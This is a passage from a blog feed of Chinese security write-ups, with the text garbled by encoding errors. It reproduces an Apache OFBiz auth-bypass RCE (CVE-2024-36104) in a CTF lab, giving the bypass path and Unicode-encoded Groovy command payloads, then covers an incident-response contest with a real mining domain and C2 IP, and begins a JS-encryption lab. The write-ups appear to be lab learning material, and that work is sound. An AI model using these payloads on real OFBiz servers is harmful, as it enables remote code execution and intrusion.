æ–¹æ³•ä¸­å¯ä»¥çœ‹åˆ°åªå–äº†è·¯å¾„çš„ç¬¬ä¸€å±‚ï¼Œåé¢çš„è·¯å¾„ä¼šç›´æ¥è¢«å¿½ç•¥</p><h3 id="è§¦å‘çš„æ ¹æœ¬åŸå› "><a href="#è§¦å‘çš„æ ¹æœ¬åŸå› " class="headerlink" title="è§¦å‘çš„æ ¹æœ¬åŸå› "></a>è§¦å‘çš„æ ¹æœ¬åŸå› </h3><p>æŸ¥çœ‹æºç å¯ä»¥å‘ç°:</p><p> <code>/framework/common/webcommon/WEB-INF/</code> è·¯å¾„ä¸‹çš„ <code>common-controller.xml</code> æ–‡ä»¶ä¸­çš„ <code>forgotPassword</code> æ˜¯ä¸éœ€è¦è®¤è¯çš„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;request-map uri=<span class="hljs-string">&quot;forgotPassword&quot;</span>&gt;<br>        &lt;security https=<span class="hljs-string">&quot;true&quot;</span> auth=<span class="hljs-string">&quot;false&quot;</span>/&gt;<br>        &lt;event type=<span class="hljs-string">&quot;java&quot;</span> path=<span class="hljs-string">&quot;org.apache.ofbiz.securityext.login.LoginEvents&quot;</span> invoke=<span class="hljs-string">&quot;forgotPassword&quot;</span>/&gt;<br>        &lt;response name=<span class="hljs-string">&quot;success&quot;</span> type=<span class="hljs-string">&quot;view&quot;</span> value=<span class="hljs-string">&quot;forgotPassword&quot;</span>/&gt;<br>        &lt;response name=<span class="hljs-string">&quot;error&quot;</span> type=<span class="hljs-string">&quot;view&quot;</span> value=<span class="hljs-string">&quot;forgotPassword&quot;</span>/&gt;<br>        &lt;response name=<span class="hljs-string">&quot;auth&quot;</span> type=<span class="hljs-string">&quot;request-redirect&quot;</span> value=<span class="hljs-string">&quot;main&quot;</span> /&gt;<br>    &lt;/request-map&gt;<br></code></pre></td></tr></table></figure><p>è€Œ <code>framework/webtools/webapp/webtools/WEB-INF/controller.xml</code>  æ–‡ä»¶ä¸­çš„ <code>ProgramExport</code> ç»è¿‡äº†è®¤è¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;request-map uri=<span class="hljs-string">&quot;ProgramExport&quot;</span>&gt;<br>    &lt;security https=<span class="hljs-string">&quot;true&quot;</span> auth=<span class="hljs-string">&quot;true&quot;</span>/&gt;<br>    &lt;response name=<span class="hljs-string">&quot;success&quot;</span> type=<span class="hljs-string">&quot;view&quot;</span> value=<span class="hljs-string">&quot;ProgramExport&quot;</span>/&gt;<br>    &lt;response name=<span class="hljs-string">&quot;error&quot;</span> type=<span class="hljs-string">&quot;view&quot;</span> value=<span class="hljs-string">&quot;ProgramExport&quot;</span>/&gt;<br>&lt;/request-map&gt;<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥ç”±äºè·¯ç”±é€»è¾‘ç¼ºé™·ï¼Œå½“ç”¨æˆ·è®¿é—® <code>/forgotPassword/ProgramExport</code> æ—¶ï¼š</p><p>é¦–å…ˆ <code>forgotPassword</code> å¯ä»¥ç›´æ¥è®¿é—®ï¼Œåç»­è·¯å¾„ <code>ProgramExport</code> è¢«é”™è¯¯åœ°å½“ä½œå­æ¥å£å¤„ç†ï¼Œç»•è¿‡äº†å¯¹ <code>ProgramExport</code> æœ¬èº«çš„æƒé™æ ¡éªŒã€‚</p><h2 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h2><p>URL ååŠ ä¸Š <code>/accounting/control/main</code> å¯ä»¥æ­£å¸¸è®¿é—®ï¼Œä¸ç„¶å°±æ˜¯ 404</p><img src="https://img.dkdun.cn/v1/2025/12/3f3590f1c7a7d93d.png" alt="image-20250711225305280" style="zoom: 50%;" /><p>å¯ä»¥çœ‹åˆ°ä¸€ä¸ª ERROR MESSAGEï¼Œå‡ºç°æŠ¥é”™ï¼Œå› ä¸ºæ˜¯éæœ¬åœ° localhost å¯åŠ¨ï¼ŒHeaders éœ€è¦åŒ…å« <code>Host: localhost</code>ï¼Œæ‰€ä»¥æŠŠ Host æ”¹ä¸ºï¼šlocalhist:port </p><img src="https://img.dkdun.cn/v1/2025/12/54b4e60a69938ffa.png" alt="image-20250711235443781" style="zoom:50%;" /><p>è¯·æ±‚ <code>/webtools/control/forgotPassword/ProgramExport</code> æ¥å£</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> Exception(<span class="hljs-string">&#x27;id&#x27;</span>.execute().t<span class="hljs-regexp">/webtools/</span>control<span class="hljs-regexp">/forgotPassword/</span>ProgramExportext);<br></code></pre></td></tr></table></figure><img src="https://img.dkdun.cn/v1/2025/12/381df96e60ff0b8d.png" alt="image-20250711235638671" style="zoom:50%;" /><p>POST ä¼ å‚</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">groovyProgram=<span class="hljs-symbol">\u0074</span><span class="hljs-symbol">\u0068</span><span class="hljs-symbol">\u0072</span><span class="hljs-symbol">\u006F</span><span class="hljs-symbol">\u0077</span><span class="hljs-symbol">\u0020</span><span class="hljs-symbol">\u006E</span><span class="hljs-symbol">\u0065</span><span class="hljs-symbol">\u0077</span><span class="hljs-symbol">\u0020</span><span class="hljs-symbol">\u0045</span><span class="hljs-symbol">\u0078</span><span class="hljs-symbol">\u0063</span><span class="hljs-symbol">\u0065</span><span class="hljs-symbol">\u0070</span><span class="hljs-symbol">\u0074</span><span class="hljs-symbol">\u0069</span><span class="hljs-symbol">\u006F</span><span class="hljs-symbol">\u006E</span><span class="hljs-symbol">\u0028</span><span class="hljs-symbol">\u0027</span><span class="hljs-symbol">\u0069</span><span class="hljs-symbol">\u0064</span><span class="hljs-symbol">\u0027</span><span class="hljs-symbol">\u002E</span><span class="hljs-symbol">\u0065</span><span class="hljs-symbol">\u0078</span><span class="hljs-symbol">\u0065</span><span class="hljs-symbol">\u0063</span><span class="hljs-symbol">\u0075</span><span class="hljs-symbol">\u0074</span><span class="hljs-symbol">\u0065</span><span class="hljs-symbol">\u0028</span><span class="hljs-symbol">\u0029</span><span class="hljs-symbol">\u002E</span><span class="hljs-symbol">\u0074</span><span class="hljs-symbol">\u0065</span><span class="hljs-symbol">\u0078</span><span class="hljs-symbol">\u0074</span><span class="hljs-symbol">\u0029</span><span class="hljs-symbol">\u003B</span><br></code></pre></td></tr></table></figure><p>å¾—åˆ° id ä¸º rootï¼Œè¯´æ˜æ‰§è¡ŒæˆåŠŸ</p><img src="https://img.dkdun.cn/v1/2025/12/a8d8e664003bcc51.png" alt="image-20250712004022679" style="zoom:50%;" /><p>åˆ—å‡ºæ ¹ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶æŸ¥çœ‹</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">throw <span class="hljs-built_in">new</span> <span class="hljs-keyword">Exception</span>(<span class="hljs-string">&#x27;ls /&#x27;</span>.<span class="hljs-keyword">execute</span>().text);<br></code></pre></td></tr></table></figure><p>åŒæ ·çš„ Unicode ç¼–ç </p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">groovyProgram=<span class="hljs-symbol">\u0074</span><span class="hljs-symbol">\u0068</span><span class="hljs-symbol">\u0072</span><span class="hljs-symbol">\u006F</span><span class="hljs-symbol">\u0077</span><span class="hljs-symbol">\u0020</span><span class="hljs-symbol">\u006E</span><span class="hljs-symbol">\u0065</span><span class="hljs-symbol">\u0077</span><span class="hljs-symbol">\u0020</span><span class="hljs-symbol">\u0045</span><span class="hljs-symbol">\u0078</span><span class="hljs-symbol">\u0063</span><span class="hljs-symbol">\u0065</span><span class="hljs-symbol">\u0070</span><span class="hljs-symbol">\u0074</span><span class="hljs-symbol">\u0069</span><span class="hljs-symbol">\u006F</span><span class="hljs-symbol">\u006E</span><span class="hljs-symbol">\u0028</span><span class="hljs-symbol">\u0027</span><span class="hljs-symbol">\u006C</span><span class="hljs-symbol">\u0073</span><span class="hljs-symbol">\u0020</span><span class="hljs-symbol">\u002F</span><span class="hljs-symbol">\u0027</span><span class="hljs-symbol">\u002E</span><span class="hljs-symbol">\u0065</span><span class="hljs-symbol">\u0078</span><span class="hljs-symbol">\u0065</span><span class="hljs-symbol">\u0063</span><span class="hljs-symbol">\u0075</span><span class="hljs-symbol">\u0074</span><span class="hljs-symbol">\u0065</span><span class="hljs-symbol">\u0028</span><span class="hljs-symbol">\u0029</span><span class="hljs-symbol">\u002E</span><span class="hljs-symbol">\u0074</span><span class="hljs-symbol">\u0065</span><span class="hljs-symbol">\u0078</span><span class="hljs-symbol">\u0074</span><span class="hljs-symbol">\u0029</span><span class="hljs-symbol">\u003B</span><br></code></pre></td></tr></table></figure><img src="https://img.dkdun.cn/v1/2025/12/3ffad9f0347922f5.png" alt="image-20250712010500138" style="zoom: 50%;" /><p>åˆ—å‡ºäº†æ‰€æœ‰æ–‡ä»¶ï¼Œæ‹¿åˆ° flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">5391</span>edef-<span class="hljs-number">3</span>ee9-<span class="hljs-number">4</span>a1a-b452-db929d329eac&#125;<br></code></pre></td></tr></table></figure><p>å‚è€ƒï¼š</p><p><a href="https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/framework/Apache-OFBiz-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E8%87%B4%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2024-36104.md">Apache OFBiz ç›®å½•éå†è‡´ä»£ç æ‰§è¡Œæ¼æ´ CVE-2024-36104</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>æ¼æ´å¤ç°</category>
      
      <category>RCE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RCE æ˜¥ç§‹äº‘é•œ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025å¹´Solaråº”æ€¥å“åº”å…¬ç›Šæœˆèµ›-5æœˆ</title>
    <link href="/2025/06/06/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-5%E6%9C%88/"/>
    <url>/2025/06/06/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-5%E6%9C%88/</url>
    
    <content type="html"><![CDATA[<h1 id="å¼€æºé¡¹ç›®"><a href="#å¼€æºé¡¹ç›®" class="headerlink" title="å¼€æºé¡¹ç›®"></a>å¼€æºé¡¹ç›®</h1><p>æ‰“å¼€ ConsoleApplication2.vcxproj æ–‡ä»¶</p><p><img src="https://img.dkdun.cn/v1/2025/12/807cc719c562c9b7.png" alt="image-20250531150015351"></p><p>ä¸¢å…¥CyberChef è§£å¯†</p><p><img src="https://img.dkdun.cn/v1/2025/12/daac402461fa3e11.png" alt="image-20250531150828101"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">target = <span class="hljs-string">&quot;LHDh1x1zdIiVS+a5qYJrBPb0ixqHTxd+uJ/3tckUdOqG+mn113E=&quot;</span>;<span class="hljs-variable">$k</span>=<span class="hljs-string">&quot;FixedKey123!&quot;</span>;<span class="hljs-variable">$d</span>=[System.Text.Encoding]::UTF8.GetBytes((Read-Host &quot;è¾“å…¥å­—ç¬¦ä¸²&quot;));<span class="hljs-variable">$s</span>=0..255;<span class="hljs-variable">$j</span>=0;0..255|%&#123;<span class="hljs-variable">$j</span>=(<span class="hljs-variable">$j</span>+<span class="hljs-variable">$s</span>[<span class="hljs-variable">$_</span>]+[byte]<span class="hljs-variable">$k</span>[<span class="hljs-variable">$_</span>%<span class="hljs-variable">$k</span>.Length])%256;<span class="hljs-variable">$s</span>[<span class="hljs-variable">$_</span>],<span class="hljs-variable">$s</span>[<span class="hljs-variable">$j</span>]=<span class="hljs-variable">$s</span>[<span class="hljs-variable">$j</span>],<span class="hljs-variable">$s</span>[<span class="hljs-variable">$_</span>]&#125;;<span class="hljs-variable">$i</span>=<span class="hljs-variable">$j</span>=0;<span class="hljs-variable">$r</span>=@();<span class="hljs-variable">$d</span>|%&#123;<span class="hljs-variable">$i</span>=(<span class="hljs-variable">$i</span>+1)%256;<span class="hljs-variable">$j</span>=(<span class="hljs-variable">$j</span>+<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>])%256;<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>],<span class="hljs-variable">$s</span>[<span class="hljs-variable">$j</span>]=<span class="hljs-variable">$s</span>[<span class="hljs-variable">$j</span>],<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>];<span class="hljs-variable">$r</span>+=<span class="hljs-variable">$_</span>-bxor<span class="hljs-variable">$s</span>[(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]+<span class="hljs-variable">$s</span>[<span class="hljs-variable">$j</span>])%256]&#125;; [System.Convert]::ToBase64String(<span class="hljs-variable">$r</span>) -eq <span class="hljs-variable">$target</span></span><br></code></pre></td></tr></table></figure><p>ç®€å• base64 å’Œ RC4 åŠ å¯†ï¼Œè§£å¯†è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span>, key: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    out = []<br><br>    <span class="hljs-comment"># KSA</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br><br>    <span class="hljs-comment"># PRGA</span><br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        K = S[(S[i] + S[j]) % <span class="hljs-number">256</span>]<br>        out.append(byte ^ K)<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(out)<br><br>target_base64 = <span class="hljs-string">&quot;LHDh1x1zdIiVS+a5qYJrBPb0ixqHTxd+uJ/3tckUdOqG+mn113E=&quot;</span><br>ciphertext = base64.b64decode(target_base64)<br>key = <span class="hljs-string">b&quot;FixedKey123!&quot;</span><br><br>plaintext = rc4(ciphertext, key)<br><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è§£å¯†ç»“æœï¼ˆUTF-8ï¼‰:&quot;</span>, plaintext.decode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br><span class="hljs-keyword">except</span> UnicodeDecodeError:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è§£å¯†å¤±è´¥ï¼ŒåŸæ–‡å¯èƒ½ä¸æ˜¯ UTF-8ã€‚åŸå§‹å†…å®¹ä¸ºï¼ˆåå…­è¿›åˆ¶ï¼‰:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(plaintext.<span class="hljs-built_in">hex</span>())<br><br></code></pre></td></tr></table></figure><p>æ‹¿åˆ° flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;rqweripqwe[rqwe[rjqw[eprjqweprij&#125;</span><br></code></pre></td></tr></table></figure><h1 id="ç³»ç»Ÿæ¯å¤©æ™šä¸Šç³»ç»Ÿéƒ½ä¼šå¡å¡çš„å¸®å°æ˜æ‰¾åˆ°é—®é¢˜å‡ºåœ¨äº†é‚£ï¼Ÿ"><a href="#ç³»ç»Ÿæ¯å¤©æ™šä¸Šç³»ç»Ÿéƒ½ä¼šå¡å¡çš„å¸®å°æ˜æ‰¾åˆ°é—®é¢˜å‡ºåœ¨äº†é‚£ï¼Ÿ" class="headerlink" title="ç³»ç»Ÿæ¯å¤©æ™šä¸Šç³»ç»Ÿéƒ½ä¼šå¡å¡çš„å¸®å°æ˜æ‰¾åˆ°é—®é¢˜å‡ºåœ¨äº†é‚£ï¼Ÿ"></a>ç³»ç»Ÿæ¯å¤©æ™šä¸Šç³»ç»Ÿéƒ½ä¼šå¡å¡çš„å¸®å°æ˜æ‰¾åˆ°é—®é¢˜å‡ºåœ¨äº†é‚£ï¼Ÿ</h1><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqf">é¢˜ç›®æè¿°<br><span class="hljs-built_in">flag</span>ä¸ºé…ç½®åç§°ï¼ˆæ— ç©ºæ ¼ï¼‰<br><span class="hljs-built_in">flag</span>&#123;xxxxx&#125;<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡å‘ç°æ¯å¤©æ™šä¸Šéƒ½ä¼šè§¦å‘</p><p><img src="https://img.dkdun.cn/v1/2025/12/960ed8afbb18b678.png" alt="image-20250531112655794"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;sqlbackingup&#125;</span><br></code></pre></td></tr></table></figure><h1 id="æ”»å‡»è€…ä½¿ç”¨ä»€ä¹ˆæ¼æ´è·å–äº†æœåŠ¡å™¨çš„é…ç½®æ–‡ä»¶ï¼Ÿ"><a href="#æ”»å‡»è€…ä½¿ç”¨ä»€ä¹ˆæ¼æ´è·å–äº†æœåŠ¡å™¨çš„é…ç½®æ–‡ä»¶ï¼Ÿ" class="headerlink" title="æ”»å‡»è€…ä½¿ç”¨ä»€ä¹ˆæ¼æ´è·å–äº†æœåŠ¡å™¨çš„é…ç½®æ–‡ä»¶ï¼Ÿ"></a>æ”»å‡»è€…ä½¿ç”¨ä»€ä¹ˆæ¼æ´è·å–äº†æœåŠ¡å™¨çš„é…ç½®æ–‡ä»¶ï¼Ÿ</h1><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">é¢˜ç›®æè¿°<br>æŸæŸæ–‡åŒ–æœ‰é™å…¬å¸çš„è¿ç»´å°ç‹åˆšåˆšæ­å»ºæœåŠ¡å™¨å‘ç°cpuè«åçš„å¼‚å¸¸çš„å‡é«˜è¯·ä½ å¸®åŠ©å°ç‹æ’æŸ¥ä¸€ä¸‹æœåŠ¡å™¨<br><span class="hljs-symbol">pass:</span>Ngy<span class="hljs-subst">@667788</span><br>flagæ ¼å¼ä¸ºï¼šflag&#123;CVE<span class="hljs-number">-2020</span><span class="hljs-number">-12345</span>&#125;<br></code></pre></td></tr></table></figure><p>æœç´¢ CrushFTPCVE æ‰¾åˆ° <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31161">CVE-2025-31161</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;CVE-<span class="hljs-number">2025</span>-<span class="hljs-number">31161</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="æ¶æ„åŸŸåæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#æ¶æ„åŸŸåæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="æ¶æ„åŸŸåæ˜¯ä»€ä¹ˆï¼Ÿ"></a>æ¶æ„åŸŸåæ˜¯ä»€ä¹ˆï¼Ÿ</h1><p>æ‰§è¡Œè„šæœ¬ç›´æ¥æŒ–çŸ¿</p><p><img src="https://img.dkdun.cn/v1/2025/12/33375800b1fac575.png" alt="image-20250531111921005"></p><p>å‘ç°åŸŸå</p><p><img src="https://img.dkdun.cn/v1/2025/12/2e2eb3c0763e74de.png" alt="image-20250531111724214"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">flag&#123;<span class="hljs-selector-tag">b</span><span class="hljs-selector-class">.oracleservice</span>.<span class="hljs-attribute">top</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="ç–‘ä¼¼æ˜¯ä»€ä¹ˆç»„ç»‡å‘åŠ¨çš„æ”»å‡»ï¼Ÿ"><a href="#ç–‘ä¼¼æ˜¯ä»€ä¹ˆç»„ç»‡å‘åŠ¨çš„æ”»å‡»ï¼Ÿ" class="headerlink" title="ç–‘ä¼¼æ˜¯ä»€ä¹ˆç»„ç»‡å‘åŠ¨çš„æ”»å‡»ï¼Ÿ"></a>ç–‘ä¼¼æ˜¯ä»€ä¹ˆç»„ç»‡å‘åŠ¨çš„æ”»å‡»ï¼Ÿ</h1><p>æ ¹æ®çš„ b.oracleservice.top åŸŸåæ‰¾åˆ°ç›¸å…³ä¿¡æ¯ï¼š8220 ç»„ç»‡</p><p><img src="https://img.dkdun.cn/v1/2025/12/3d2816f2bfe6a47b.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">8220</span>Gang&#125;<br></code></pre></td></tr></table></figure><h1 id="æ”»å‡»è€…C2æœåŠ¡å™¨IPæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#æ”»å‡»è€…C2æœåŠ¡å™¨IPæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="æ”»å‡»è€…C2æœåŠ¡å™¨IPæ˜¯ä»€ä¹ˆï¼Ÿ"></a>æ”»å‡»è€…C2æœåŠ¡å™¨IPæ˜¯ä»€ä¹ˆï¼Ÿ</h1><p>æŸ¥çœ‹æ—¥å¿—ï¼Œå‘ç°ä¸‹è½½äº† ps æ–‡ä»¶</p><p><img src="https://img.dkdun.cn/v1/2025/12/ef504118092a3efa.png" alt="image-20250531171445456"></p><p>ç„¶åæ‰¾åˆ° IP </p><p><img src="https://img.dkdun.cn/v1/2025/12/962f2a2a1e080292.png" alt="image-20250531172207174"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">156.238.230.57</span>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>åº”æ€¥å“åº”&amp;å–è¯</category>
      
    </categories>
    
    
    <tags>
      
      <tag>åº”æ€¥å“åº”</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åˆæ¢ JS é€†å‘ä¹‹ encrypt-labs</title>
    <link href="/2025/05/27/JS-%E9%80%86%E5%90%91%E4%B9%8B-encrypt-labs/"/>
    <url>/2025/05/27/JS-%E9%80%86%E5%90%91%E4%B9%8B-encrypt-labs/</url>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å­¦é•¿æ¨èçš„ä¸€ä¸ªé¶åœºï¼Œå¯¹äº js è¿™ä¸€å—è¿˜æ²¡æ¥è§¦è¿‡ï¼Œæ‰€ä»¥æ¥æ‰“æ‰“ï¼Œæ„Ÿè§‰è¿˜æ˜¯æŒºä¸é”™çš„</p><blockquote><p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/SwagXz/encrypt-labs">https://github.com/SwagXz/encrypt-labs</a></p><p>ä½œè€…ï¼šSwagXz</p></blockquote><p>burp è‡ªåŠ¨åŠ è§£å¯†æ’ä»¶ autoDecederï¼š<a href="https://github.com/f0ng/autoDecoder">https://github.com/f0ng/autoDecoder</a> (æœ‰æ—¶å€™ä¼šæœ‰ç‚¹å°é—®é¢˜)</p><p>æµè§ˆå™¨æ’ä»¶ï¼š<a href="https://ctool.dev/">https://ctool.dev/</a></p><h1 id="AES-å›ºå®š-key"><a href="#AES-å›ºå®š-key" class="headerlink" title="AES å›ºå®š key"></a>AES å›ºå®š key</h1><p>ä¹±è¾“ï¼Œç„¶åæŠ“åŒ…</p><img src="https://img.dkdun.cn/v1/2025/12/03f020ec19d93395.png" style="zoom:67%;" /><p>å‘ç°äº† <code>encryptedData</code> åŠ å¯†å‚æ•°</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<br><span class="hljs-string">&quot;encryptedData&quot;</span>: <span class="hljs-string">&quot;nArXfVdnoe67UzojAPP2X+6qSiznLMBAI3a5Bi+zlNx05J187TZuSqk/iecDaXCv&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><img src="https://img.dkdun.cn/v1/2025/12/e1aa6e7d7b152f79.png" style="zoom: 50%;" /><p>æŸ¥çœ‹ js ä»£ç æœç´¢å…³é”®å­—æ‰¾åˆ°äº† aes åŠ å¯†ä»£ç ï¼ŒCBC æ¨¡å¼çš„ AES åŠ å¯†ï¼Œä¸‹æ–­ç‚¹æ‰§è¡Œï¼Œæœ‰å›ºå®šçš„ key å’Œ ivï¼Œå¯ä»¥ç›´æ¥è¿˜åŸæ˜æ–‡</p><img src="https://img.dkdun.cn/v1/2025/12/0f98298f996105b4.png" style="zoom: 33%;" /><p>key å’Œ iv</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> key = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">enc</span>.<span class="hljs-property">Utf8</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">&quot;1234567890123456&quot;</span>);<br><span class="hljs-keyword">const</span> iv = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">enc</span>.<span class="hljs-property">Utf8</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">&quot;1234567890123456&quot;</span>);<br></code></pre></td></tr></table></figure><p>æ˜æ–‡æ•°æ®</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;username&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;111&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h1 id="AES-æœåŠ¡ç«¯è·å–-Key"><a href="#AES-æœåŠ¡ç«¯è·å–-Key" class="headerlink" title="AES æœåŠ¡ç«¯è·å– Key"></a>AES æœåŠ¡ç«¯è·å– Key</h1><p>èµ·äº†ä¸¤ä¸ªè¯·æ±‚ï¼Œåˆ†åˆ«è·å– aes_key å’Œ aes_ivï¼Œç„¶ååˆ©ç”¨ç®—æ³•å¯¹æ•°æ®è¿›è¡ŒåŠ å¯†ä¼ è¾“</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;aes_key&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;yC1rjcwgTO\/OFlmZteNzoQ==&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;aes_iv&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;8RQcaNn16DrwppYR+rrURg==&quot;</span><span 